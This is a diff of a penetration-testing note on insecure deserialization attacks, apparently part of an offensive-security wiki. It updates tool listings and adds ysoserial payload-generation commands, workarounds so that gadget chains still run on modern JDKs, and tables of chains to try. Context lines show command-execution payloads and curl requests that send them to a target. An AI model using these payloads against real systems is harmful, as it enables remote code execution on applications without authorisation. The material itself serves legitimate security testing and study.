@@ -1,6 +1,6 @@
 # Deserialization Attacks
 
-#Deserialization #RCE #Java #PHP #WebAppAttacks
+#Deserialization #RCE #Java #PHP #DotNet #Python #Ruby #NodeJS #WebAppAttacks #ysoserial #phpggc #marshalsec #ViewState #GadgetChains
 
 ## What is this?
 
@@ -12,12 +12,13 @@ Insecure deserialization enables object injection, property manipulation, or RCE
 
 | Tool | Language | Purpose |
 |---|---|---|
-| `ysoserial` | Java | Gadget chain payload generation — `wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar` |
-| `phpggc` | PHP | PHP gadget chain generation — `git clone https://github.com/ambionics/phpggc` |
-| `ysoserial.net` | .NET | .NET gadget chains — `git clone https://github.com/pwntester/ysoserial.net` |
-| `marshalsec` | Java | Java unmarshalling exploit helper (Jackson, XStream, etc.) |
-| `Burp Deserialization Scanner` | All | Detect and exploit deserialization (BApp Store extension) |
-| `SerializationDumper` | Java | Dump Java serialized objects in readable form |
+| [[Tools/Payloads & Shells/ysoserial\|ysoserial]] | Java | Gadget chain payload generation |
+| [[Tools/Payloads & Shells/phpggc\|phpggc]] | PHP | PHP gadget chain generation |
+| [[Tools/Payloads & Shells/ysoserial.net\|ysoserial.net]] | .NET | .NET gadget chains + ViewState payloads |
+| [[Tools/Payloads & Shells/marshalsec\|marshalsec]] | Java | Java unmarshalling exploit helper (Jackson, XStream, etc.) + JNDI/LDAP referral server |
+| [[Tools/Payloads & Shells/SerializationDumper\|SerializationDumper]] | Java | Dump Java serialized objects in readable form |
+| [[Tools/Web/Burpsuite\|Burp Suite]] | All | Deserialization Scanner / Freddy extensions (BApp Store) |
+| `GadgetBuilder` | Java | Newer chain builder (2026) — merges ysoserial's 31 chains with ~29 others; revives chains on JDK 16+ (see note below) |
 
 ---
 
@@ -72,6 +73,23 @@ java -jar ysoserial-all.jar CommonsCollections6 "bash -c {echo,${B64}}|{base64,-
 # Common chains to try in order:
 # CommonsCollections6 → CC5 → CC1 → CC2 → CC3 → CC4 → Spring1 → Spring2 → Groovy1
 ```
+
+> [!warning] **ysoserial has been unmaintained since 2021.** Many of its chains rely on reflection into `java.*` internals, which JDK 16+ blocks by default (JEP 396 strong encapsulation). A chain that "should" work can fail with `InaccessibleObjectException` on a modern target — that is a tooling failure, not proof the target is patched. Confirm the target's Java version before ruling a chain out.
+
+```bash
+# Running ysoserial itself on a modern JDK — reopen the packages it reflects into
+java --add-opens java.base/java.util=ALL-UNNAMED \
+     --add-opens java.base/java.lang=ALL-UNNAMED \
+     --add-opens java.base/java.lang.reflect=ALL-UNNAMED \
+     --add-opens java.base/java.net=ALL-UNNAMED \
+     --add-opens java.base/java.io=ALL-UNNAMED \
+     -jar ysoserial-all.jar CommonsCollections6 'id' > payload.ser
+
+# Simplest workaround: generate payloads under JDK 8/11 even if the target runs 17+
+# (the serialized bytes are what matter, not the generating JVM)
+```
+
+> [!tip] Where ysoserial's chain set comes up dry against a recent target, `GadgetBuilder` (2026) bundles a substantially larger chain corpus and restores ~17 ysoserial chains for Java 16+. Worth reaching for before concluding the sink isn't exploitable.
 
 ### Send Payload
 
@@ -406,6 +424,7 @@ puts Base64.strict_encode64(payload)
 #   rails-session-decoder (Ruby)  — decode/encode Rails 4/5/6/7 cookies given the secret
 #   or a rails console on the box: ActiveSupport::MessageEncryptor with the derived key
 # https://github.com/Neohapsis/... (search "rails secret key base session")
+```
 
 > [!note] Modern Rails (4+) uses JSON-serialized, HMAC-signed cookies. Marshal deser is primarily a concern on legacy Rails 3.x or apps that explicitly use `Marshal.load`. If you have `SECRET_KEY_BASE`, forge the session directly rather than trying to craft Marshal payloads. See [[Non-PHP Web App Attacks]].
 
@@ -436,7 +455,8 @@ curl -s "http://<target>/error" | grep -i "commons\|spring\|struts\|log4j\|shiro
 
 | Platform | Tool | Common Chains |
 |----------|------|--------------|
-| Java | ysoserial | CC1-7, Spring1-2, Groovy1 |
+| Java | ysoserial (JDK 8/11 to generate) | CC1-7, Spring1-2, Groovy1 |
+| Java (JDK 16+ target) | GadgetBuilder, or ysoserial with `--add-opens` | Larger corpus; ysoserial chains often fail bare |
 | Java (Shiro) | ysoserial + AES key | CommonsCollections |
 | PHP | phpggc | Laravel/RCE1-9, Symfony/RCE1-4 |
 | .NET | ysoserial.net | TypeConfuseDelegate, ObjectDataProvider |
@@ -457,5 +477,5 @@ curl -s -X POST "http://<target>/api" --data-binary @ping.ser
 ---
 
 *Created: 2026-03-04*
-*Updated: 2026-07-21*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-07-30*
+*Model: claude-opus-5*
